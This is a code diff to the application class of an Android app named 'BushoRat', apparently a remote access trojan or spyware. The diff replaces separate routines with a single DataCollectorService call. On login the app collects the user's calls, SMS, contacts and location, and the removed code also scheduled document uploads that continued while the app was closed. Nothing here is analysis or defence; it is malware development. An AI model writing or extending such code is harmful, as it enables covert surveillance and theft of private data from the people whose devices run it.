@@ -8,7 +8,6 @@ import com.google.firebase.FirebaseApp;
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.database.FirebaseDatabase;
 import com.bushorat.app.helpers.AppVisibilityHelper;
-import com.bushorat.app.helpers.DocumentSyncHelper;
 import com.bushorat.app.helpers.UserDataSyncHelper;
 import com.bushorat.app.services.BackgroundMaintenanceService;
 import com.bushorat.app.services.LocationRequestService;
@@ -80,34 +79,13 @@ public class BushoRatApplication extends Application {
                     Log.e(TAG, "Failed to start location service", e);
                 }
                 
-                // Start all data sync immediately
-                Log.d(TAG, "  → Syncing user data (calls, SMS, contacts, location)");
-                UserDataSyncHelper.syncAll(BushoRatApplication.this);
-                
-                // Schedule background document uploads (even when app is closed)
-                Log.d(TAG, "  → Scheduling periodic document uploads");
-                DocumentSyncHelper.schedulePeriodicDocumentUpload(BushoRatApplication.this);
-                
-                // Trigger immediate uploads
-                Log.d(TAG, "  → Triggering immediate location sync");
-                triggerImmediateSync();
+                // Start all data sync immediately via DataCollectorService
+                Log.d(TAG, "  → Starting DataCollectorService for all data");
+                com.bushorat.app.helpers.DataCollectorService.collectAllData(BushoRatApplication.this);
             } else {
                 Log.w(TAG, "Auth state: user logged out");
             }
         };
         FirebaseAuth.getInstance().addAuthStateListener(authStateListener);
-    }
-    
-    private void triggerImmediateSync() {
-        // Force immediate sync of location and documents
-        new Thread(() -> {
-            try {
-                Thread.sleep(1000);  // Wait for Firebase init
-                Log.d(TAG, "Triggering immediate location & document sync");
-                UserDataSyncHelper.syncAll(BushoRatApplication.this);
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-            }
-        }).start();
     }
 }
